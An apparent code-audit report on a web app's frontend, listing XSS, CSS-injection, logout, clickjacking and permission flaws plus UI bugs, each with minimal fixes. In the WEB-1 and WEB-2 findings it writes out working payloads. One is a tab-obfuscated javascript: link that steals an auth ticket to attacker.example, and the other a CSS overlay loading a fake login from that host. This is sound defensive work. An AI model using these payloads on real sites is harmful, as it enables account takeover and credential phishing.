# Web frontend audit — XSS sinks, token handling, client authz, correctness

Scope: `apps/web/src/**`, `apps/web/scripts/serve.mjs`, plus the few API files needed to judge whether a
frontend finding is actually reachable (`middleware/auth.go`, `middleware/cors.go`, `platform/config/config.go`,
`services/security/src/content.rs`).

Method note — read this before trusting any severity: **the shell is broken in this environment
(`pwsh` exits `0xC0000142`), so nothing here was executed.** No `npm`, `vitest`, `tsc`, or build was run.
Every finding below is a static read of the source, and every XSS claim is traced source → sink; where the
trace stops at a server boundary I say so explicitly instead of guessing.

What the frontend's own threat model looks like (this matters for severity):

* Article/page **bodies** are rendered from `rendered_html` produced by the Rust security service, which uses
  `ammonia` with an explicit URL-scheme allowlist (`services/security/src/content.rs:77-80`). That sink is safe —
  see "Verified safe".
* **Everything the browser renders itself** (block builder, themes, extensions, custom CSS) never touches that
  sanitizer. Those paths are where this audit found real defects.
* The whole site appearance — pages, blocks, theme, permission matrix, extensions — lives in
  `localStorage['pp.web.config.v1']` (`lib/customize.ts:54-60`), per browser, with JSON import/export for
  "migration" (`lib/customize.ts:950-972`). So "stored" XSS in these paths is stored **in the victim's browser**,
  and the delivery vector is an imported bundle, not a database row.

### Severity summary

| ID | Sev | Title | Primary location |
|----|-----|-------|------------------|
| WEB-1 | High | HTML sanitizer `javascript:` filter bypassable with a tab inside the scheme → script execution in site origin | `lib/markdown.ts:321` |
| WEB-2 | High | Theme-token validation is a prefix test → arbitrary global CSS injection from an imported theme | `lib/theme.ts:348-355` |
| WEB-3 | Medium | Logout swallows server failure, leaving the HttpOnly refresh cookie alive → silent re-login | `lib/api.ts:326-334` |
| WEB-4 | Medium | No anti-framing headers anywhere, and *any* iframe is trusted as the "preview frame" | `lib/access.ts:386-392`, `scripts/serve.mjs:117-126` |
| WEB-5 | Medium | Permission model promotes every account to `owner` on a "personal" site; whole capability matrix is client-local | `lib/permissions.ts:174-178` |
| WEB-6 | Low | Four of five block-HTML builders interpolate raw user text, then feed `execCommand('insertHTML')` | `lib/richBlocks.ts:67-125` |
| WEB-7 | Low | Unescaped block id interpolated into a CSS selector in the preview bridge | `components/PreviewBridge.tsx:179,188,199` |
| WEB-8 | Low | `?mode=live` forces the setup wizard, which will POST the admin password to whatever API base is typed | `App.tsx:77-83`, `pages/Setup.tsx:381` |
| BUG-1 | Medium | Drag-and-drop reorder in the page builder lands one slot off when moving a block downwards | `lib/blockTree.ts:132-144` + `pages/admin/ThemeBuilder.tsx:226` |
| BUG-2 | Medium | Unsaved article edits are lost on in-app navigation; the `dirty` flag only guards tab close | `lib/hooks.ts:91-101`, `pages/admin/Editor.tsx:149-150` |
| BUG-3 | Low | Dark/light logic chains can ping-pong forever (no cooldown on the theme-trigger path) | `components/LogicRuntime.tsx:206-230` |
| BUG-4 | Low | `useAsync` keeps the previous resource's data, so the first painted frame after an id change shows the old article under the new URL | `lib/hooks.ts:16-50`, `pages/site/ContentDetail.tsx:216` |

---

## WEB-1 — High — `javascript:` filter in the client sanitizer is bypassable with a tab inside the scheme

**Where**

```
apps/web/src/lib/markdown.ts:319   const value = attr.value.trim();
apps/web/src/lib/markdown.ts:321   if ((name === 'href' || name === 'src' || name === 'xlink:href') && /^javascript:/i.test(value)) {
apps/web/src/lib/markdown.ts:322     el.removeAttribute(attr.name);
```

**Why it fails.** `DOMParser` has already decoded entities, so `href="java&#9;script:alert(1)"` arrives here as
the string `java<TAB>script:alert(1)`. `trim()` only strips the ends; `/^javascript:/i` is anchored at the start,
so it does not match, and the attribute is kept. When the fragment is re-serialized
(`markdown.ts:341` → `doc.body.innerHTML`) the TAB is written back literally (the HTML fragment serializer only
escapes `&`, `"`, `<`, `>`, NBSP), and when the browser later parses that `href` for navigation the WHATWG URL
parser strips all ASCII tab/newline characters first. Net result: `javascript:alert(...)`.

Same class, same fix: `&#10;`, `&#13;`, and leading C0 controls (`&#1;javascript:...`, which the URL parser also
trims) all survive the filter for the same reason.

**The traced source → sink chain**

1. Author-controlled text block body: `blockProp(block, 'body', '')` (`components/blocks/MediaBlocks.tsx:42`).
2. Rendered as HTML with the client sanitizer as the *only* gate:
   `MediaBlocks.tsx:57` → `dangerouslySetInnerHTML={{ __html: sanitizeHtml(renderMarkdown(body)) }}`.
   `renderMarkdown` routes anything starting with `<` into `rawHtmlBlock` → `sanitizeHtml`
   (`lib/markdown.ts:114-118`, `209-215`), and `TextBlock` sanitizes a *second* time — the payload survives both
   passes because the defect is in the scheme test, not in a pass count.
3. That `TextBlock` is what renders the home page (`pages/site/Home.tsx:53`, `customization.home`), custom pages
   (`pages/site/CustomPage.tsx:49-57`) and the article layout (`pages/site/ContentDetail.tsx:198`).
4. The same sanitizer also produces `rendered_html` in demo mode — `lib/demo.ts:671` and `:705` call
   `renderSource(...)` → `sanitizeHtml` for `source_format: 'html'` (`lib/markdown.ts:356`) — which is then
   rendered by `pages/site/ContentDetail.tsx:514`, i.e. the "this is server-sanitized, trust it" sink is *not*
   server-sanitized in demo mode.
5. Editor preview puts the same output into a contentEditable via `innerHTML`
   (`components/RichTextEditor.tsx:223`, fed by `components/builder/RichTextBlockModal.tsx:25`).

Payload (place in a `text` block body, or in a `text` block inside an exported page bundle):

```html
<p>欢迎阅读本站。</p>
<a href="java&#9;script:fetch('/api/v1/auth/ws-ticket',{method:'POST'}).then(r=>r.json()).then(d=>fetch('https://attacker.example/?t='+d.ticket))">点这里继续</a>
```

**User-visible impact.** One click on authored content executes arbitrary JS in the site's own origin. Because
the CSRF token is deliberately JS-readable (`lib/api.ts:150` `this.csrf = session.csrf_token || readCookie('pp_csrf')`)
and `/auth/token/refresh` is a cookie-authenticated POST that returns a fresh access token
(`lib/api.ts:302-324`), same-origin JS can mint a usable access token and exfiltrate it: full account takeover of
whoever clicks — including a site admin, which means persistent backdooring of the site.

**Reachability, stated honestly.** Direct authoring of blocks is an admin action, so on a single-admin install
this is self-inflicted. The realistic delivery is the import path that the product itself advertises for moving
a site between browsers: `parseCustomizationFile` (`lib/customize.ts:950-972`) accepts any JSON and keeps page
layouts verbatim (`lib/customize.ts:735-745`), so an "exported page bundle" / theme bundle handed to an admin
("import this, it's our new homepage layout") carries the payload. That is why this is High rather than Critical:
needs a click, needs an imported bundle.

**Minimal fix**

* Replace `sanitizeHtml` with DOMPurify (`ALLOWED_URI_REGEXP` is already correct there), or
  * normalize before matching — `const probe = value.replace(/[\u0000-\u0020\u00a0]+/g, '').toLowerCase()` and then
    **allowlist** (`probe.startsWith('https:') || probe.startsWith('http:') || probe.startsWith('mailto:') ||
    probe.startsWith('/') || probe.startsWith('#')`) instead of denylisting `javascript:`;
  * and re-parse the serialized result once more before returning (`text/html` round-trip) so the fix survives
    serialization quirks.

---

## WEB-2 — High — Theme token validation is a prefix test, so an imported theme can inject arbitrary global CSS

**Where**

```
apps/web/src/lib/theme.ts:348    if (
apps/web/src/lib/theme.ts:349      /^#[0-9a-fA-F]{3,8}$/.test(trimmed) ||
apps/web/src/lib/theme.ts:350      /^color-mix\(/.test(trimmed) ||
apps/web/src/lib/theme.ts:351      /^var\(/.test(trimmed)
apps/web/src/lib/theme.ts:352    ) {
apps/web/src/lib/theme.ts:353      out[key] = trimmed.slice(0, 120);
```

`color-mix(` and `var(` are **prefix** tests, and the value is only length-clipped afterwards. It is then
interpolated raw into a stylesheet:

```
apps/web/src/lib/theme.ts:448   ([key, value]) => `  ${CSS_TOKEN_NAME[key] ?? `--${key.replace(/_/g, '-')}`}: ${value};`,
```

…and written as text content of a `<style>` element at `components/CustomizationLayer.tsx:19` (and pre-paint at
`main.tsx:25`). `textContent` cannot break out of the element, but CSS has no such protection: a `;` and a `}`
end the declaration and the `:root` rule.

**Payload** (token value, 78 chars, under the 120 limit; note the trailing `/*` swallows the rest of the sheet):

```json
{ "theme": { "tokens": { "background": "color-mix(in srgb, #fff 50%, #fff);} body{display:none} html::before{content:'';position:fixed;inset:0;z-index:2147483647;background:#fff url(https://attacker.example/fake-login.png) center/contain no-repeat} /*" } } }
```

**Impact.** Full-page UI redressing in the site origin: the real UI can be hidden and replaced with a
pixel-perfect fake login/consent screen (CSS `position:fixed;inset:0`), and outbound `url(...)` beacons leak
"this visitor opened the site" (and, with attribute selectors, some DOM state) to a third party. No script
execution — this is CSS injection, not XSS — but it is the same untrusted-import delivery as WEB-1 and it is
enough to phish an admin's password, which then yields the account.

**Reachability.** Same import path as WEB-1 (`lib/customize.ts:950-972` → `normalizeThemeSettings` at
`lib/customize.ts:597` → `normalizeThemeTokens`). The UI presents these as "just colors", which is why the prefix
check is worth fixing rather than documenting. Related raw-CSS sinks that share the delivery vector and should be
treated as "trusted input only" in docs: `customization.custom_css` → `<style>` at `components/SiteChrome.tsx:523`
(20 000 chars, `lib/customize.ts:717`) and the loading-screen variant at `components/LoadingLayer.tsx:108`.

**Minimal fix.** Validate CSS values with a real allowlist rather than a prefix:
accept only `#rgb(a)`, `rgb()/hsl()` with a numeric grammar, and `var(--token[, fallback])` / `color-mix(...)`
matched against a strict character class (`/^[#a-zA-Z0-9(),.%\s/-]+$/` plus a hard reject of `;`, `{`, `}`, `/*`);
or parse with `CSSStyleSheet`/`insertRule` in a try/catch and drop anything that throws.

---

## WEB-3 — Medium — Logout that fails server-side leaves the session alive; the UI still says "logged out"

**Where**

```
apps/web/src/lib/api.ts:326   async logout(): Promise<void> {
apps/web/src/lib/api.ts:328       await this.request<void>('/auth/logout', { method: 'POST' });
apps/web/src/lib/api.ts:329     } catch {
apps/web/src/lib/api.ts:330       /* 登出失败不阻塞本地清理 */
apps/web/src/lib/api.ts:331     } finally {
apps/web/src/lib/api.ts:332       this.clearSession();
apps/web/src/lib/api.ts:333     }
```

`clearSession()` (`lib/api.ts:154-158`) only drops the in-memory bearer token and the GET cache. The refresh
token lives in an **HttpOnly cookie the frontend cannot touch** (`apps/api/internal/auth/handler.go:417-418`);
only `/auth/logout` clears it (`handler.go:425-427`). So when the POST does not reach the server, the cookie
survives — and the next page load calls `backend.refresh()` unconditionally
(`lib/session.tsx:81-101`, refresh at `:87`), which succeeds and logs the user straight back in.

This is not hypothetical: the request goes through the browser-side rate limiter, which can reject it before it
is ever sent — `backend.tsx:272-283` rejects with `AccessBlockedError` when `accessController.beforeRequest()`
says no, and `'logout'` is not in `NON_REQUEST_METHODS` (`backend.tsx:251-256`). That specific trigger requires
the site owner to have enabled 访问限制 (`DEFAULT_ACCESS.enabled` is `false`, `lib/access.ts:22-38`), so treat it
as one of several failure modes; a transient 5xx or a dropped connection produces the same outcome with no
configuration at all.

**Impact.** User on a shared/library computer clicks "退出登录", the toast/screen says they are anonymous, they
walk away — and the next person to open the site is authenticated as them. (For the attacker-JS variant of this
chain see WEB-1; here the trigger is plain unreliability.)

**Minimal fix.** Do not clear local state unless the server confirms, or at least surface the failure:
`return { ok: boolean }` from `logout()` and render "无法在服务端注销，请重试" instead of switching to the
anonymous shell; bypass the access guard for `/auth/logout` (add it to the same exemption list as admin paths);
and consider having the API clear cookies on any `POST /auth/logout` even when the bearer token is already gone.

---

## WEB-4 — Medium — Nothing sets `frame-ancestors`/`X-Frame-Options`, and "am I an iframe?" is treated as "am I the trusted preview?"

**Where**

```
apps/web/src/lib/access.ts:386  export function isPreviewFrame(): boolean {
apps/web/src/lib/access.ts:388    return window.parent !== window;
apps/web/src/lib/access.ts:390    return true;
```

Any embed at all — including a random page that frames the site — is treated as the site's own preview iframe.
Consumers: `lib/backend.tsx:273` (skips the request rate limiter entirely), `lib/access.ts:395`,
`components/ProtectionLayer.tsx:131,139` (no page-switch counting, no block screen),
`lib/tabPresence.ts:132` (not counted), `components/DomainGuard.tsx:30` (domain whitelist skipped),
`App.tsx:134` (install-verification skipped), `components/PreviewBridge.tsx:18` (click/drag interceptors installed).

Nothing in the deployment sets an anti-framing header. `apps/web/scripts/serve.mjs` sends only `nosniff`
(`:117-126` for files, `:63-68` for JSON), and a repo-wide grep for `X-Frame-Options`/`frame-ancestors`/CSP finds
nothing in the Go API middleware either — the only such text is in the design doc and in the nginx snippet
generator, which emits HSTS but no framing directive (`lib/serverConfig.ts:63`).

**Impact**

* Unconditional: any third party can frame the site and, for those visitors, the site's own access limiting,
  tab counting, domain guard and analytics silently switch off; `PreviewBridge` also swallows every click on a
  `[data-pp-block]` element (`PreviewBridge.tsx:213-217`), so links inside blocks stop working inside the frame.
  Client-side limiting is documented as best-effort (`lib/access.ts:10-20`), so this is mostly defense-in-depth.
* Conditional but worse: clickjacking of the authenticated admin UI. With the default cookie policy this is
  blocked by the cookie itself — the refresh cookie is `SameSite=Lax` unless cross-site credentials are enabled
  (`apps/api/internal/auth/handler.go:410-414`), and a Lax cookie is not sent in a cross-site iframe, so the
  framed SPA fails `refresh()` and stays anonymous. But `CORS_ALLOW_CREDENTIALS=true` (the documented option for
  hosting the SPA on another origin, `config.go:267-268`) flips the cookie to `SameSite=None`, and then a framed
  `/admin/members` will authenticate and execute the admin's clicks: role changes, member deletion, publishing.

**Minimal fix.** Emit `Content-Security-Policy: frame-ancestors 'self'` (and `X-Frame-Options: SAMEORIGIN` for
old browsers) from `serve.mjs` for both `sendFile` and `sendJson`, and from the API middleware; add it to the
generated nginx snippet. On the client, stop inferring trust from `window.parent !== window`: require
`window.frameElement` to be same-origin **and** an explicit flag (e.g. `?pp_preview=1` set only by
`PreviewFrame`), and keep the protections on otherwise.

---

## WEB-5 — Medium — On a "personal" site every logged-in account is treated as `owner`; the whole capability matrix is client-local

**Where**

```
apps/web/src/lib/permissions.ts:174  export function effectiveGroup(ctx: PermissionContext): PermissionGroupId {
apps/web/src/lib/permissions.ts:176    if (ctx.kind === 'personal') return 'owner';
apps/web/src/lib/permissions.ts:177    return groupIdForRole(ctx.role);
```

`kind` comes from `siteKindOf(config)` (`lib/usePermissions.ts:25`) — i.e. from
`localStorage['pp.web.config.v1'].site_kind` (`lib/site.ts:9-11`), not from the server. `role` does come from the
server (`me.role`), but it is ignored on personal sites. So on a personal-blog install, *every* account — an
old guest author, an account created before the site was switched from "community" to "personal", any account
still able to log in — is rendered as `owner` with all capabilities, and `AdminGate`
(`components/AdminGate.tsx:48-53`) plus `RoleGate` will hand them the full admin console (members, permissions,
site settings, page builder, extensions, raw CSS, sandboxed-but-arbitrary extension JS).

Two compounding facts:

* The entire capability matrix (`customization.permissions`) is client state — `lib/customize.ts:54-60` says so
  explicitly ("契约 v0.1.0 没有主题、页面或插件端点"). Any user can edit their own localStorage to grant
  themselves capabilities, and an imported bundle can ship a matrix that grants `guest` everything. The UI tells
  the user this is harmless because "权限由服务端强制校验" (`components/Guards.tsx:32-33`) — that claim is only
  true if the API independently derives capabilities from `role`, which the frontend never verifies.
* Conversely, a *community*-site member can set `site_kind: "personal"` locally and be shown the admin console;
  whether anything real happens then depends entirely on the API.

**Impact.** Either a UI-only authorization illusion that puts 100% of the burden on server enforcement (and
misleads admins into thinking the permission screen they just edited is enforced), or — if any server check
mirrors this shortcut — privilege escalation from any account to site owner. The client code gives no evidence
either way, so this must be resolved on the API side.

**Check server too (blocking question for the Go audit):** does `GET /me`/any capability check on the API map
`role: member` to `manage_site` when the site was configured as a personal blog? Everything here suggests the
server only knows four roles (`apps/api/internal/...` `Role`), which would make this a UI bug — a loud one.

**Minimal fix.** Derive the group from the server-issued role only (`groupIdForRole(me.role)`), and treat
`site_kind` as presentation. If "personal blog ⇒ all accounts are admins" is a product requirement, enforce it
server-side and return the effective capabilities in `/me` so the client stops inventing them, and reword the
"用户组" screen to say the matrix is stored in this browser only.

---

## WEB-6 — Low — Four of the five block-HTML builders interpolate raw user input, and the result is inserted with `execCommand('insertHTML')`

**Where** — `lib/richBlocks.ts`; the fifth function escapes everything, which shows the intent:

```
apps/web/src/lib/richBlocks.ts:68   const img = `<img src="${src}" alt="${alt}" />`;
apps/web/src/lib/richBlocks.ts:69   const body = href ? `<a href="${href}">${img}</a>` : img;
apps/web/src/lib/richBlocks.ts:71   return `<p class="pp-image">${body}</p>\n<p class="pp-caption">${caption}</p>`;
apps/web/src/lib/richBlocks.ts:109  ... `<strong>${title || '视频标题'}</strong>` ...
apps/web/src/lib/richBlocks.ts:120  return `<a class="pp-embed" href="${url}">` ...
apps/web/src/lib/richBlocks.ts:124  return `<a href="${href}">${text}</a>`;
```

vs. `richBlocks.ts:153-158`, where `linkCardBlock` runs `escapeHtml()` over cover/label/note/href.

Call sites: `components/EditorToolbar.tsx:852` (`imageBlock`), `:979` (`videoBlock`), `:1051` (`embedBlock`),
rendered via `RichTextEditor.tsx:288-298` → `document.execCommand('insertHTML', …)` (`:296`) into the
contentEditable of the **admin** document, and `EditorToolbar.tsx:617` renders `linkCardBlock(...)` with
`dangerouslySetInnerHTML`.

**Impact.** `insertHTML` parses real HTML in the admin origin, and `<img src=x onerror=…>` fires immediately, so
`alt`/`caption`/`title` values containing `"><img src=x onerror=alert(1)>` are script execution in the editor
(an author attacking their own session — self-XSS), and the resulting raw HTML is also written into the saved
Markdown, relying on the server's ammonia pass to neutralize it on the public copy. Rated Low because the current
inputs are typed by the same person; it is listed because these helpers are the documented way to build blocks,
one of the five already escapes, and the next caller that feeds them a remote value (a shared bookmark card, an
import, an OG-preview fetched from a pasted URL) turns this into stored XSS with no further change.

**Minimal fix.** Escape every interpolation inside `richBlocks.ts` (reuse `escapeHtml` from `lib/markdown.ts`),
and validate `src`/`href` scheme inside the builders rather than only in the dialog, so the guarantee does not
depend on which UI calls them.

---

## WEB-7 — Low — Block id interpolated into a CSS selector without `CSS.escape`

```
apps/web/src/components/PreviewBridge.tsx:179  const target = document.querySelector<HTMLElement>(`[data-pp-block="${data.blockId}"]`);
apps/web/src/components/PreviewBridge.tsx:188  ...same...
apps/web/src/components/PreviewBridge.tsx:199  ...same...
```

The handler does check the origin first (`PreviewBridge.tsx:171 if (event.origin !== window.location.origin) return;`),
so only a same-origin sender can reach it — that is why this is not an injection finding. But an id containing `"`
throws `SyntaxError: Failed to execute 'querySelector'` from inside a `message` listener, aborting focus/locate/
animation preview with no visible error. The codebase already knows the right pattern: `LogicRuntime.tsx:26` uses
`CSS.escape(id)` with a try/catch.

**Fix.** `document.querySelector(`[data-pp-block="${CSS.escape(String(data.blockId))}"]`)` in all three places
(and the same shape in `pages/admin/ThemeBuilder.tsx:210-238`, which validates via `findBlock` and is fine).

---

## WEB-8 — Low — `?mode=live` switches the app into the install wizard, which will send the admin password to any API base

```
apps/web/src/App.tsx:77   const forceLive =
apps/web/src/App.tsx:79     new URLSearchParams(window.location.search).get('mode') === 'live';
apps/web/src/App.tsx:81   const needsLiveSetup =
apps/web/src/App.tsx:82     forceLive && (!config || config.mode !== 'live' || !config.setup_complete);
```

Any link ending in `?mode=live` drops a demo/installed site into `SetupPage`, whose live path collects an
existing admin's email + password (`pages/Setup.tsx:483-491`, `1413-1416`) and posts them to the API base typed
into the form — `pages/Setup.tsx:381 password: draft.admin.password` against `normalizeOrigin(draft.apiBase)`.

**Impact.** Credential phishing using the product's own, correctly-styled wizard on its own domain: an attacker
who can get an admin to click a crafted link can present "reconnect this site to its API" and receive the real
password at a host they control. Requires the victim to type the password, so Low — but the parameter is a
cheap trust-boundary switch and should not exist on a completed install.

**Fix.** Honour `?mode=live` only when no config exists (or gate it behind an explicit confirmation that names
the target API host), and show the API host prominently on every step that accepts credentials.

---

## BUG-1 — Medium — Page-builder drag-and-drop lands one slot off when moving a block downwards

```
apps/web/src/lib/blockTree.ts:132   const without = removeBlock(blocks, id);
apps/web/src/lib/blockTree.ts:133   // target.index 是移除后目标兄弟数组里的插入下标；编辑器在生成投放位置时
apps/web/src/lib/blockTree.ts:134   // 已经按“放到某一行之后”换算过，这里不再对同一父级做二次偏移。
apps/web/src/lib/blockTree.ts:135   let index = target.index;
```

The comment asserts the caller pre-adjusted the index; the caller does not:

```
apps/web/src/pages/admin/ThemeBuilder.tsx:226  const index = targetLocation.index + (data.position === 'after' ? 1 : 0);
apps/web/src/pages/admin/ThemeBuilder.tsx:236  changeBlocks(moveBlock(history.value, data.sourceId, { parentId, column, index }));
```

`targetLocation.index` is the index in the **pre-removal** array (`findBlock`, `blockTree.ts:29-43`), but
`insertBlock` applies it to the **post-removal** array. Correct math for a same-parent move is
`index - 1` when `source.index < target.index`.

Concrete: root list `[A, B, C]`, drag **A** onto "after B" → `index = 1 + 1 = 2`; `removeBlock` leaves
`[B, C]`; insert at 2 gives `[B, C, A]` instead of `[B, A, C]`. Drag A "before C" → `index = 2` → `[B, C, A]`
again instead of `[B, A, C]`. Upward moves are correct, which is why this survives casual testing.

**Impact.** Reordering components in the page builder silently persists the wrong layout (localStorage and
exported bundles included); the user has to notice, undo, and retry, and "move down one step" is often impossible
without first moving it further than intended.

**Fix.** In `moveBlock`, compensate when source and target share a parent:
`if (target.parentId === (found.parent?.id ?? null) && found.index < target.index) index -= 1;`
(or have the caller pass the intended neighbour + side and compute the index inside `moveBlock`).

---

## BUG-2 — Medium — Unsaved article content is lost on in-app navigation

```
apps/web/src/lib/hooks.ts:91   export function useUnsavedWarning(dirty: boolean) {
apps/web/src/lib/hooks.ts:94       const handler = (event: BeforeUnloadEvent) => {
apps/web/src/lib/hooks.ts:98       window.addEventListener('beforeunload', handler);
apps/web/src/pages/admin/Editor.tsx:149  const dirty = JSON.stringify(form) !== JSON.stringify(initial) || targetStatus !== initialStatus;
apps/web/src/pages/admin/Editor.tsx:150  useUnsavedWarning(dirty);
```

There is no react-router blocker anywhere in the app (grep for `useBlocker` / `unstable_usePrompt`: no hits).
`beforeunload` fires on tab close/reload only; clicking any sidebar link, the "内容库" back link
(`Editor.tsx:377`) or a breadcrumb unmounts the editor and the `RichTextEditor` DOM plus `form.source_body` are
discarded. Returning to the page re-fetches from the API.

**Impact.** A writer types a long post, clicks "成员" to check something (or the browser's back button), and the
draft is gone with no prompt and no autosave. The `dirty` computation exists but only protects the one exit path
users rarely take.

**Fix.** Add `useBlocker` (react-router v6.4+) keyed off the existing `dirty` flag and render a confirm dialog,
and/or debounce-persist the draft (`updateDraft` is already available) plus a "已自动保存 hh:mm" indicator.

---

## BUG-3 — Low — Dark/light logic chains can loop forever

```
apps/web/src/components/LogicRuntime.tsx:206  useEffect(() => {
apps/web/src/components/LogicRuntime.tsx:221      const result = evaluateChain(chain, ctx, false);
apps/web/src/components/LogicRuntime.tsx:225        update({ theme: applyMode(state.theme, next) });
apps/web/src/components/LogicRuntime.tsx:230  }, [mode, needs.dark, chains.length, update]);
```

Unlike the main evaluation path this effect has no cooldown (`lastFiredRef`/`COOLDOWN` are only applied at
`:126-131`), and `update` is in its dependency list — `update` is recreated whenever `config` changes
(`lib/customize.ts:768-773`), i.e. by the very write the action performs. So a chain `dark_on → switch_mode(light)`
paired with `dark_off → switch_mode(dark)` flip the mode on every pass, each pass writing the whole config to
localStorage and re-rendering. `triggerMatches` for these is `dark_on` when `mode === 'dark'` and `dark_off` when
`mode === 'light'` (`lib/logic.ts:175-178`), so the pair is self-sustaining.

**Impact.** Tab hangs / main-thread spin and a localStorage write storm; only reachable if an admin configures
both chains (or imports a bundle that does).

**Fix.** Apply the same per-chain cooldown on the theme path (share `lastFiredRef`), and only fire on genuine
mode *changes* (`prev.mode !== mode` captured in a ref) rather than on any effect run.

---

## BUG-4 — Low — `useAsync` never clears `data` on dependency change, so the first painted frame after an id change shows the previous article

`useAsync` (`lib/hooks.ts:16-50`) sets `loading` inside the effect (`:26`) but leaves `data` from the previous
deps. `ContentDetailPage` renders from `content.data` (`pages/site/ContentDetail.tsx:216-217`) and only takes the
skeleton branch on `content.loading` (`:400`), so between the navigation render and the effect the whole previous
article — title, body (`:514`), SEO (`:221-251`) — is painted under the new URL while `id` already points at the
new item, which is what the reaction/comment/`stateFor` calls use (`:261-276`, `:288`, `:299`, `:347-355`).
Same pattern in `Archive`/`SearchPage`; `Archive.tsx:95` also counts only `published` items (`:68`) while
`has_more` may still be true, so "已载入 N 篇" can read 0 with a non-empty list.

**Impact.** A one-frame (16–32 ms) window where the wrong article is displayed and an accidental interaction is
attributed to the wrong content id; mostly a correctness/polish bug, listed because the same helper is used on
every data page.

**Fix.** In `useAsync`, `setData(null); setError(null)` when the deps change (or expose `key` so callers can
render `key !== currentId` as loading), and compute the "N 篇" counters from the unfiltered response plus a
server-side status filter.

---

## Verified safe (checked, not vulnerable — with the condition that makes it true)

* **`rendered_html` → `dangerouslySetInnerHTML` at `pages/site/ContentDetail.tsx:514`.** Safe **because** the Go
  API only ever stores output of the Rust security service, which runs `ammonia` with an explicit scheme
  allowlist (`services/security/src/content.rs:77-80`), plus tag/attribute allowlists. Condition: nothing may
  write `rendered_html` directly, and `security_unavailable` must fail closed (503) rather than store raw HTML —
  worth confirming in the Go/Rust audits. Not safe to rely on in demo mode; see WEB-1.
* **Comment and message bodies.** Rendered as React text nodes, never as HTML:
  `components/blocks/EngageBlocks.tsx:161` (`<p>{comment.body}</p>`), `pages/admin/Comments.tsx:330`.
  No markdown/HTML rendering of member-authored text anywhere.
* **CSRF on state-changing API calls.** Impossible by construction: the API authenticates only via
  `Authorization: Bearer` (`apps/api/internal/transport/http/gin/middleware/auth.go:22-45`, no cookie fallback),
  and a cross-site page cannot set that header without a preflight that CORS refuses. The frontend's
  `credentials: 'include'` on every call (`lib/api.ts:192`) is therefore harmless for writes. Of the two
  cookie-authenticated POSTs, `/auth/token/refresh` is double-submit-protected via the readable `pp_csrf` cookie
  plus `X-CSRF-Token` (`lib/api.ts:305-311`); `/auth/logout` sends no CSRF header, but forging it only logs the
  victim out (nuisance, no state disclosure) so it is not rated.
* **CORS.** Exact-origin echo only, and `*` combined with credentials is rejected at config load
  (`apps/api/internal/transport/http/gin/middleware/cors.go:60-89`, `platform/config/config.go:273-278`);
  default is "cross-origin disabled".
* **Open redirect.** `pages/site/Auth.tsx:33-34` validates `next` (`startsWith('/') && !startsWith('//')`) before
  `navigate()`; all producers of `next` encode the path. No `returnTo`-style sink elsewhere.
* **Token storage / logging.** No access or refresh token in `localStorage`/`sessionStorage`; bearer lives in a
  private field (`lib/api.ts:130-136`), CSRF token in a JS-readable cookie by design. No `console.*` call logs a
  token (`lib/demo.ts:169`, `components/ExtensionHost.tsx:170-206` only log ids/names). Refresh is single-flight
  across concurrent 401s (`lib/api.ts:302-324`, `refreshPromise`).
* **Extension sandbox.** `components/ExtensionHost.tsx:252-262` uses `sandbox="allow-scripts"` with **no**
  `allow-same-origin` (opaque origin — cannot read host DOM/cookies/localStorage), validates
  `event.source === frame.contentWindow` (`:156`), requires per-message manifest permissions (`:25-33`, `:167-172`),
  caps `navigate` to same-site paths (`:205`), and the srcdoc carries a restrictive CSP plus JSON/`</script>`
  escaping (`lib/extensions.ts:341-342`, `377-387`).
* **Custom code block.** `components/blocks/DataBlocks.tsx:338-344` iframes user HTML/CSS/JS with
  `sandbox="allow-scripts"` and no `allow-same-origin`; arbitrary script is contained by design (no CSP there, so
  it can still beacon out with images — expected for a code block).
* **All `postMessage` senders use an explicit target origin** (`components/PreviewBridge.tsx:49-133`,
  `components/builder/PreviewFrame.tsx:74-97`, `pages/admin/ThemeBuilder.tsx:199`), and all three receivers check
  `event.origin === window.location.origin` first. The only `'*'` targets are the opaque-origin extension iframe,
  which is unavoidable and paired with an `event.source` check on the way back
  (`lib/extensions.ts:467`, `components/ExtensionHost.tsx:136,222`).
* **Port-change / state-import endpoints** (`apps/web/scripts/serve.mjs:199-226`, `285-316`): loopback-only,
  `Origin` must equal `Host`, `Content-Type: application/json` required, 32-hex single-use token, TTL-bounded.
  The migration token does appear in the URL (`components/AccessPort.tsx:51-52` builds
  `?pp_import=<token>`; `lib/runtime.ts:131-133` reads it), but retrieval is loopback-only and one-shot, and
  `importMovedSite` strips it with `history.replaceState` (`lib/runtime.ts:158`) — acceptable.
* **Inline CSS from block props.** `lib/blockStyles.ts:11-29` accepts declarations only (no selectors, rejects
  `{}<>@`, `url(`, `expression(`, `javascript:`) and React applies them as inline style; `themeColor`
  (`lib/theme.ts:334-338`) is hex-only for the three base colors. The hole is `tokens` (WEB-2).
* **SEO head writes.** `lib/seo.ts:88-148` uses `setAttribute`/`textContent`, and JSON-LD is inert
  (`type="application/ld+json"`); no string-concatenated `<meta>` HTML, no `srcdoc`, no `document.write`.
* **Navigation hrefs.** `lib/navigation.ts:131-138` (`safeHref`) drops non-http(s) schemes for nav tabs;
  `lib/customize.ts:167-196` (`normalizeCoverUrl`) rejects `javascript:` and `data:text/html` for covers, with
  tests at `lib/covers.test.ts:86-132`.

## Open questions handed to the Go/Rust auditors

1. Does the API derive capabilities strictly from `role`, ignoring client-provided permission groups and
   `site_kind`? (WEB-5 — if yes this is a UI bug, if no it is privilege escalation.)
2. Does the content write path ever store `rendered_html` produced without the security service (degraded mode,
   `apps/api/internal/infrastructure/securityclient/unavailable.go`)? (WEB-1 becomes Critical if so, because the
   client then renders unsanitized author HTML at `ContentDetail.tsx:514` for **all** users, not just demo mode.)
3. Does `/auth/logout` clear the refresh cookie even when the bearer token is expired/absent, and is the
   `refresh` endpoint single-use with rotation? (WEB-3.)
